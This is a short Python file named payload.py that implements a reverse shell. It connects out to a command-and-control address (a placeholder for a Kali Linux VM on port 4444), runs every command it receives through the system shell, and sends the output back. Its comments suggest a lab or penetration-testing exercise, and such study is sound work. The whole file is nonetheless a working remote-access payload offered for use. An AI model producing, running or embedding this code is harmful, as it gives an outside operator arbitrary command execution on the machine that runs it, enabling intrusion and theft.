# payload.py
import socket
import subprocess
import os

# --- CONFIGURE THE C2 IP ADDRESS ---
# IMPORTANT: This must be the IP address of your KALI LINUX VM
C2_HOST = 'YOUR_KALI_VM_IP' 
C2_PORT = 4444

def connect_to_c2():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((C2_HOST, C2_PORT))
            while True:
                command = s.recv(1024).decode('utf-8')
                if command.lower() == 'exit':
                    break
                # Execute the command and capture the output
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                # Send back the output or any error
                s.sendall((output.stdout + output.stderr).encode('utf-8'))
        except ConnectionRefusedError:
            pass # Keep trying to connect in a real scenario
        except Exception:
            pass # Handle other errors

if __name__ == "__main__":
    connect_to_c2()
